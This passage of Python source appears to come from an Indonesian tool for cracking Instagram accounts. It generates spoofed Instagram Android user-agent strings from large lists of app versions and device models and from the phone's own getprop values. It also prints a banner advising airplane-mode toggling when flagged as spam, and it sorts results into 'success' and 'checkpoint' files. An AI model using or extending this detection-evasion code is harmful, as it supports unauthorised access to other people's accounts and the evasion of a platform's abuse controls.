4.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182,253.0.0.23.114")
		igve=igv.split(",")
		andro=rc(["30/11","31/12","29/10"])
		versi=rc(igve)
		android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
		model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
		build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
		large_device = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
		merk_device = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
		brand_device = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
		cpu_device = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
		versi_app = str(random.randint(111111111,999999999))
		language = "en_GB"
		try:
			simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
		except:
			simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
		ua = [
		f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; realme; {real}; {me}; {com}; {comi})",
		f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; {merk_device}; {brand_device}; {model_device}; {com}; {comi})",
		f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (23/{random.randrange(5,12)}.0.1; {dpi}720x1464; INFINIX MOBILITY LIMITED/Infinix; Infinix X682B; Infinix-X682B; mt6769; tr_TR; 269790803)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (27/{random.randrange(5,12)}.1.0; {dpi}dpi; 1080x2141; vivo; vivo 1907; 1907; mt6768; ru_RU; 388829083)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (22/{random.randrange(5,12)}.1.1; {dpi}dpi; 720x1280; samsung; SM-E500H; e53g; qcom; in_ID; 98288239)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (22/{random.randrange(5,12)}.1.1; {dpi}dpi; 720x1370; HMD Global/Nokia; Nokia 4.2; PAN_sprout; qcom; it_IT; 217948971)'
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (22/{random.randrange(5,12)}.1; {dpi}dpi; 1080x1794; HMD Global/Nokia; TA-1041; C1N; qcom; en_GB; 382290498)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 720x1440; HUAWEI; DUB-LX1; HWDUB-Q; qcom; en_US; 225283631)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1080x1776; Sony; F5121; F5121; qcom; de_DE; 384108453)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1440x2712; Sony/docomo; SO-01L; SO-01L; qcom; in_ID; 383877306)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (26/{random.randrange(5,12)}.0.0; {dpi}dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; in_ID; 98288242)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; id_EN; 98288242)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1080x1920; LENOVO/Lenovo; Lenovo K33b36; K33b36; qcom; in_ID; 103516666)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (21/{random.randrange(5,12)}.0.1; {dpi}dpi; 1080x2201; vivo; vivo 1851; 1851; qcom; en_US; 382290498)',
	    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1080x2278; vivo; vivo 1939; 2004; qcom; en_US; 383877305)',
	    f"Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (23/{str(rr(4,13))}; {dpi}dpi; {pxl}; Meizu; MX6; MX6; {com}; {comi})"]
		return random.choice(ua)

	def ua_rmx(self):
		rr=random.randint
		rc=random.choice
		real=rc(["RMX3363","RMX3241","RMX3081","RMX3363","RMX3201","RMX1851"])
		me=rc(["RE54ABL1","RE513CL1","RMX3081L1","RE54ABL1","RMX3201","RMX1851"])
		com=rc(["qcom","mt6833","mt6765"])
		comi="in_ID"
		dpi=rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
		pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"])
		igv=("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182,253.0.0.23.114")
		igve=igv.split(",")
		andro=rc(["30/11","31/12","29/10"])
		versi=rc(igve)
		ua = f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; realme; {real}; {me}; {com}; {comi})"
		return ua

		
	def ingfo(self):
		prints(Panel(f"\t  [white]Hidupkan Mode Pesawat 10 Detik Jika terdeteksi [red]SPAM[/]",width=80,padding=(0,3),style=f"{color_table}"))
		prints(Panel(f''' {SE}╭─────────────────────────────────╮{SE} ╭───────────────────────────────────╮
 {SE}│ [white]result/[green]success-{day}.txt[/]{SE}  │ {SE}│ [white]result/[yellow]{K2}checkpoint-{day}.txt[/] {SE}│
 {SE}╰─────────────────────────────────╯{SE} ╰───────────────────────────────────╯''',title=f"[[white] Cek Hasil [/]]",width=80,style=f"{color_table}"))
	def ifo(self):
		urut = []
		urut.append(Panel(f' [white][[blue]01[white]]. Method @ V1[white] [[green]recommend[white]]\n [white][[blue]02[white]]. Method Api #[white] [[green]recommend[white]]\n [white][[blue]03[white]]. Method Api $[white] [[green]recommend[white]]',width=40,title=f"[white]Method Api",style=f"{color_table}"))
		#urut.append(Panel(f' [white][[blue]04[white]]. Method Ajax V1 [white] [[green]recommend[white]]\n [white][[blue]05[white]]. Method Ajax V2 [white] [[green]recommend[white]]\n [white][[blue]06[white]]. Method Ajax V3 [white] [[green]recommend[white]]',width=40,title=f"[white]Method Ajax",style=f"{color_table}"))
		self.tol.print(Columns(urut))
		
	def ua_baru(self):
		rc=random.choice
		igv=self.vers()
		ua = rc([
		f"Instagram {igv} Android (29/10; 280dpi; 720x1472; motorola; moto e(7); malta; mt6762; in_ID; 486308406)",
		f"Instagram {igv} Android (30/11; 480dpi; 1080x2218; motorola; motorola one action; troika_sprout; exynos9610; in_ID; 486308487)",
		f"Instagram {igv} Android (29/10; 272dpi; 720x1358; motorola; moto g(7) play; channel; qcom; in_ID; 483850199)",
		f"Instagram {igv} Android (29/10; 420dpi; 1080x2144; motorola; moto g(8) plus; doha; qcom; in_ID; 483850214)",
		f"Instagram {igv} Android (30/11; 238dpi; 720x1479; motorola; moto g(20); java; ums512_1h10; in_ID; 483850212)",
		f"Instagram {igv} Android (31/12; 280dpi; 720x1528; motorola; moto e22; borag; mt6765; in_ID; 486089352)",
		f"Instagram {igv} Android (31/12; 280dpi; 720x1440; motorola; moto g22; hawaiip; mt6765; in_ID; 486308486)",
		f"Instagram {igv} Android (28/9; 280dpi; 720x1418; motorola; moto e(6) plus; pokerp; mt6762; in_ID; 483850199)",
		f"Instagram {igv} Android (28/9; 306dpi; 720x1410; motorola; moto e(6) plus; pokerp; mt6762; in_ID; 483850154)",
		f"Instagram {igv} Android (29/10; 460dpi; 1080x2069; motorola; moto g(8) plus; doha; qcom; in_ID; 483850214)",
		f"Instagram {igv} Android (30/11; 480dpi; 1080x2266; motorola; motorola one action; troika_sprout; exynos9610; in_ID; 483850214)",
		f"Instagram {igv} Android (30/11; 280dpi; 720x1466; motorola; moto g(20); java; ums512_1h10; in_ID; 483850212)",
		f"Instagram {igv} Android (29/10; 260dpi; 720x1478; motorola; moto g(8) power lite; blackjack; mt6765; in_ID; 483850070)",
		f"Instagram {igv} Android (30/11; 280dpi; 720x1515; motorola; moto g(9) play; guamp; qcom; in_ID; 483850212)",
		f"Instagram {igv} Android (31/12; 280dpi; 720x1472; motorola; moto e22; borag; mt6765; in_ID; 483850086)"])
		return ua
		
	def ua_ran(self):
		op = random.choice(['OPPO 1105', 'oppo 15', 'Oppo 3T', 'Oppo 62A', 'oppo6779', 'oppo6833', 'OPPO7273', 'Oppo 9A', 'Oppo A1', 'PHQ110', 'PHQ110', 'PCHM10', 'PCHM10', 'PCHM10', 'PCHM10', 'CPH2071', 'PCHT30', 'PCHM00', 'CPH2083', 'CPH2083', 'CPH2083', 'CPH2185', 'CPH2179', 'CPH2269', 'CPH2421', 'CPH2349', 'CPH2271', 'CPH2477', 'CPH2471', 'CPH2471', 'CPH1923', 'CPH1923', 'CPH1923', 'CPH1923', 'CPH1925', 'oppo A25', 'CPH1837', 'PADT00', 'PADM00', 'CPH1837', 'PADM00', 'OPPO A30', 'OPPO A30', 'OPPO A30', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'OB-OPPO A31c', 'PDVM00', 'PDVM00', 'PDVM00', 'PDVM00', 'CPH2137', 'OPPO A33', 'OPPO A33m', 'OPPO A33t', 'OPPO A34', 'Oppo A34', 'PEFM00', 'PEFM00', 'PEFM00', 'PEFM00', 'PESM10', 'PESM10', 'PESM10', 'PESM10', 'OPPO A36', 'OPPO A37m', 'OPPO A37f', 'A37fw', 'OPPO A37t', 'OPPO A37t', 'OPPO A38', 'CPH1605', 'CPH1605', 'CPH1803', 'OPPO CPH1803', 'OPPO CPH1803', 'OPPO PBBM30', 'CPH1803', 'CPH1853', 'Oppo A4', 'OPPO A40', 'Oppo A400', 'OPPO A41', 'OPPO A42', 'OPPO A43', 'Oppo A43', 'OPPO A44', 'OPPO A45', 'Oppo A45', 'OPPO A46', 'OPPO A47', 'OPPO A48', 'OPPO A49', 'OPPO PBBT30', 'PBAM00', 'CPH1809', 'OPPO PBAT00', 'OPPO PBAM00', 'PBAM00', 'CPH1809', 'CPH1809', 'OPPO PBAM00', 'PBAT00', 'CPH1931', 'CPH1933', 'OPPO A50', 'OPPO A51', 'oppo A51', 'CPH2069', 'CPH2061', 'CPH2061', 'CPH2127', 'CPH2139', 'PECM20', 'PECT30', 'PECM30', 'PECM30', 'OPPO A53m', 'OPPO A53m', 'OPPO A53m', 'CPH2135', 'CPH2321', 'CPH2239', 'CPH2239', 'CPH2195', 'OPG02', 'CPH2273', 'CPH2325', 'PEMT20', 'PEMM20', 'PEMT00', 'PEMM00', 'PEMM00', 'PEMM20', 'PEMM00', 'PEMM20', 'A102OP', 'CPH2309', 'OPPO A56', 'PFVM10', 'PFVM10', 'CPH2407', 'OPPO A57', 'CPH1701', 'OPPO A57', 'CPH1701', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'CPH2387', 'PHJ110', 'PHJ110', 'PHJ110', 'PHJ110', 'PHJ110', 'OPPO A59', 'OPPO A59m', 'OPPO A59m', 'OPPO A59s', 'OPPO A59S', 'OPPO A59s', 'OPPO A59st', 'OPPO A59t', 'CPH1909', 'CPH1901', 'OPPO PBFT00', 'OPPO PBFM00', 'CPH1717', 'CPH1801', 'CPH1801', 'Oppo A71A', 'CPH2067', 'PDYM20', 'PDYM10', 'PDYT10', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'CPH2161', 'CPH2099', 'OPPO A73t', 'OPPO A73t', 'OPPO A73t', 'CPH2219', 'OPPO CPH2219', 'CPH2197', 'CPH2263', 'CPH2375', 'CPH1715', 'OPPO A77', 'CPH2339', 'CPH2385', 'CPH2473', 'OPPO A77t', 'OPPO A77t', 'OPPO A77t', 'OPPO A77t', 'CPH2483', 'OPPO A79', 'OPPO A79', 'OPPO A79kt', 'OPPO A79', 'OPPO A79k', 'OPPO A79k', 'OPPO A79t', 'OPPO A79t', 'OPPO A79t', 'OPPO A79t', 'PCDM00', 'OPPO PCDM00', 'PCDM00', 'PCDM00', 'PCDT00', 'PBBM00', 'PBBM00', 'PBBM00', 'PBBT00', 'PDBM00', 'PDBM00', 'PDBM00', 'PDBM00', 'OPPO A83', 'CPH1729', 'OPPO A83', 'CPH1827', 'CPH1827', 'OPPO A83t', 'OPPO A83t', 'OPPO A83t', 'PCAM10', 'PCAM10', 'PCAM10', 'CPH1938', 'PCAT10', 'PCAM10', 'CPH1938', 'CPH1937', 'CPH1941', 'CPH2001', 'CPH2021', 'PCPM00', 'CPH2001', 'CPH2001', 'CPH2001', 'CPH2001', 'CPH2059', 'PDKT00', 'PDKM00', 'PDKT00', 'PDKT00', 'PDKM00', 'CPH2121', 'PEHM00', 'CPH2123', 'PFGM00', 'PFGM00', 'PFGM00', 'CPH2203', 'CPH2333', 'CPH2365', 'PHA120', 'PHA120', 'OPPO A96', 'PFUM10', 'PFUM10', 'PFUM10', 'PFTM10', 'PFTM10', 'Oppo A98', 'PCEM00', 'PCEM00', 'PCET00', 'CPH1851', 'CPH1920', 'CPH1903', 'A1603', 'OPPOCNM632', 'CPH1114', 'CPH1235', 'CPH1451', 'CPH1615', 'CPH1664', 'CPH1869', 'CPH1869', 'CPH1929', 'CPH1985', 'CPH2048', 'CPH2048', 'CPH2048', 'CPH2107', 'CPH2238', 'CPH2332', 'CPH2351', 'CPH2389', 'CPH2419', 'CPH2451', 'CPH2465', 'CPH2467', 'CPH2529', 'CPH2531', 'CPH2531', 'CPH2589', 'CPH2643', 'CPH3475', 'CPH3669', 'CPH3682', 'CPH3731', 'CPH3776', 'CPH3785', 'CPH4125', 'CPH4275', 'CPH4299', 'CPH4395', 'CPH4473', 'CPH4987', 'CPH5286', 'CPH5841', 'CPH5947', 'CPH6178', 'CPH6244', 'CPH6271', 'CPH6316', 'CPH6519', 'CPH6528', 'CPH6697', 'CPH7338', 'CPH7364', 'CPH7382', 'CPH7532', 'CPH7577', 'CPH7991', 'CPH8153', 'CPH8346', 'CPH8347', 'CPH8363', 'CPH8393', 'CPH8467', 'CPH8472', 'CPH8534', 'CPH8686', 'CPH8893', 'CPH9177', 'CPH9226', 'CPH9659', 'CPH9667', 'CPH9716', 'CPH9763', 'CPH9929', 'oppo f 5 plus', 'OPPO F1 Plus', 'Oppo F1', 'Oppo F1', 'X9009', 'OPPO R9m', 'X9009', 'Oppo F10', 'CPH1911', 'CPH1969', 'Oppo F11Pro', 'CPH2095', 'CPH2119', 'OPPO F19', 'Oppo F19', 'CPH2285', 'CPH2285', 'CPH2213', 'CPH2213', 'CPH2223', 'A1601', 'OPPO F1s', 'OPPO F1s', 'A1601', 'CPH2341', 'CPH2461', 'CPH2455', 'CPH2461', 'CPH2455', 'CPH2527', 'CPH1609', 'CPH1609', 'CPH1609', 'CPH1613', 'CPH1727', 'CPH1723', 'CPH1727', 'CPH1723', 'CPH1723', 'CPH1725', 'CPH1725', 'Oppo F51', 'Oppo F61 Pro', 'CPH1819', 'CPH1821', 'CPH1819 Flow', 'CPH1881', 'CPH1825', 'CPH1825', 'CPH1881', 'CPH1881', 'CPH1825', 'CPH1881', 'CPH1823', 'X909', 'X909', 'R827T', 'R827T', 'R827', 'X9076', 'X9077', 'X9070', 'X9077', 'X9076', 'X9077', 'X9006', 'X9007', 'X9000', 'X9007', 'X9006', 'X9006', 'R815W', 'R815T', 'R815', 'R8111', 'OPPOR8111', 'R821T', 'R821', 'R821', 'PEUM00', 'PEUM00', 'PEUM00', 'PEUM00', 'PGU110', 'PGU110', 'CPH2437', 'PGT110', 'U707T', 'PAFM00', 'CPH1875', 'PAFT00', 'CPH1871', 'PAHM00', 'PAHM00', 'PAHM00', 'PAHM00', 'CPH2023', 'PDEM10', 'CPH2005', 'CPH2025', 'Find X2 Pro', 'PDEM30', 'PEDM00', 'PEDM00', 'Find X3 Neo', 'CPH2173', 'OPG03', 'PEEM00', 'CPH2307', 'PFFM10', 'CPH2305', 'PFEM10', 'OPPOJLAJH6', 'R1011', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCT10', 'CPH2373', 'PGJM10', 'CPH2337', 'PGIM10', 'PGGM10', 'PGGM10', 'CPH1955', 'PCNM00', 'PCNM00', 'PCNM00', 'PCLM50', 'PCLM50', 'PCLM50', 'PERM00', 'PERM00', 'PERM00', 'PEXM00', 'PEXM00', 'PEXM00', 'PEYM00', 'PEYM00', 'PEYM00', 'PERM10', 'PERM10', 'PGCM10', 'PGCM10', 'PGCM10', 'N5117', 'N5117', 'N5117', 'N1T', 'N1T', 'N5209', 'N5207', 'N5207', 'R831T', 'R831T', 'R831', 'Oppo Neo 7', 'R831K', 'R831K', 'R831K', '1201', 'A33w', 'A33f', 'A33fw', 'OPD2102A', 'OPD2101', 'OPPO R10', 'R1001', 'OPPO R11', 'OPPO R11t', 'OPPO R11t', 'OPPO R11t', 'OPPO R11t', 'OPPO R11', 'OPPO R11 Plusk', 'OPPO R11 Plus', 'OPPO R11 Plus', 'OPPO R11 Pluskt', 'OPPO R11plus', 'OPPO R11s', 'OPPO R11s', 'OPPO R11st', 'OPPO R11s', 'CPH1719', 'OPPO R11st', 'OPPO R11s', 'OPPO R11s', 'CPH1721', 'OPPO R11s Plus', 'OPPO R11s Plust', 'PAAM00', 'PACM00', 'PACM00', 'PACT00', 'CPH1835', 'PAAM00', 'CPH1831', 'PBCM10', 'PBCM10', 'PBCM10', 'PBCM10', 'PBCM10', 'PBEM00', 'CPH1879', 'PBET00', 'PBEM00', 'CPH1893', 'CPH1893', 'CPH1893', 'CPH1893', 'CPH1877', 'PBDM00', 'PBDT00', 'R8001', 'R8006', 'R8006', 'R8007', 'R8000', 'R8007', 'R8007', 'R8200', 'R8201', 'R8200', 'R8206', 'R2001', 'R2010', 'R2017', 'R2017', 'R8107', 'R8109', 'R8106', 'R8107', 'Oppo R53', 'R6007', 'R7g', 'OPPO R7', 'R7f', 'OPPO R7', 'OPPO R7', 'R7kf', 'R7Plus', 'R7Plusm', 'R7Plus', 'R7Plust', 'R7Plusm', 'R7Plust', 'R7Plusm', 'R7plusf', 'R7005', 'R7007', 'R7007', 'R7sf', 'OPPO R7s', 'OPPO R7sPlus', 'OPPO R7sPlus', 'OPPO R7sm', 'OPPO R7sm', 'oppo r7sm', 'OPPO R7sm', 'OPPO R7sm', 'OPPO R7st', 'OPPO R7t', 'OPPO R7t', 'R801', 'R805', 'OPPOR805', 'R811', 'R819', 'R819T', 'R819T', 'R819T', 'R8205', 'R8207', 'R8207', 'R8207', 'R823T', 'R829', 'R829T', 'R830', 'R830S', 'R833T', 'OPPO R9 Plusm A', 'OPPO R9 Plustm A', 'OPPO R9 Plusm A', 'OPPO R9 Plusm A', 'OPPO R9 Plusm A', 'OPPO R9 Plustm A', 'X9079', 'OPPO R9km', 'OPPO R9km', 'OPPO R9km', 'OPPO R9sk', 'OPPO R9sk', 'CPH1607', 'OPPO R9st', 'CPH1611', 'OPPO R9s Plus', 'OPPO R9t', 'OPPO R9t', 'OPPO R9tm', 'OPPO R9tm', 'OPPO R9tm', 'OPPO R9tm', 'CPH1917', 'PCAM00', 'PCAM00', 'PCAM00', 'PCAT00', 'PCCT00', 'PCCT00', 'CPH1919', 'PCCM00', 'CPH1907', 'CPH1907', 'CPH1907', 'CPH1907', 'PCKM00', 'CPH1907', 'CPH1989', 'CPH1989', 'CPH1951', 'CPH1945', 'CPH1945', 'CPH2043', 'CPH2043', 'PDCM00', 'A001OP', 'PDCM00', 'PDCM00', 'PCRT01', 'PCRT01', 'CPH2009', 'CPH2035', 'CPH2037', 'CPH2013', 'A002OP', 'CPH2113', 'CPH2091', 'PDPM00', 'PDPT00', 'CPH2125', 'CPH2109', 'CPH2109', 'PDNM00', 'CPH2089', 'PDNM00', 'PDNT00', 'PEAT00', 'PEAM00', 'PEAM00', 'CPH2209', 'CPH2065', 'CPH2159', 'CPH2159', 'CPH2145', 'PEGM00', 'CPH2205', 'CPH2207', 'PDSM00', 'CPH2201', 'PDST00', 'PDSM00', 'PDRM00', 'PDRM00', 'PDRM00', 'PDRM00', 'PDRM00', 'CPH2199', 'A101OP', 'A103OP', 'CPH2217', 'CPH1921', 'PEGM10', 'PEGT10', 'PEGT10', 'PEGM10', 'PEGT10', 'CPH2211', 'CPH2235', 'CPH2251', 'PEQM00', 'PEPM00', 'PEPM00', 'CPH2247', 'CPH2249', 'PENM00', 'PENM00', 'PENM00', 'PENM00', 'CPH2237', 'CPH2237', 'CPH2371', 'CPH2363', 'CPH2293', 'PFDM00', 'PFCM00', 'PFCM00', 'PFCM00', 'A201OP', 'CPH2353', 'OPG04', 'CPH2343', 'PGBM10', 'PGBM10', 'PGBM10', 'CPH2357', 'CPH2359', 'PFZM10', 'CPH2457', 'CPH2481', 'CPH2505', 'PHM110', 'PHM110', 'PHM110', 'PHM110', 'PGX110', 'PGX110', 'PGX110', 'PGW110', 'PGW110', 'PGW110', 'CPH1983', 'CPH1983', 'PCLM10', 'PCLM10', 'PCLM10', 'PCLM10', 'PDHM00', 'arm_64 PDHM00', 'PDHM00', 'PCGM00', 'PCGM00', 'PCGM00', 'PCGM00', 'CPH1979', 'PCDM10', 'CPH1979', 'Oppo Reno2 /MMB29M', 'OPPO Reno5 Pro Plus', 'Oppo S1', 'Oppo S17', 'Oppo S4', 'OPPOT29', 'U705T', 'U705T', 'Oppo V5', 'OW20W1', 'OW19W2', 'OW19W3', 'OW19W1', 'oppo x', 'Oppo X', 'OPPO x20 70816.012', 'OPPO x22 6.012', 'OPPOX9017', 'OPPOX907', 'OPPOX907', 'Oppo Y15', 'Oppo Y21', 'Oppo Y3', 'Oppo Z1'])
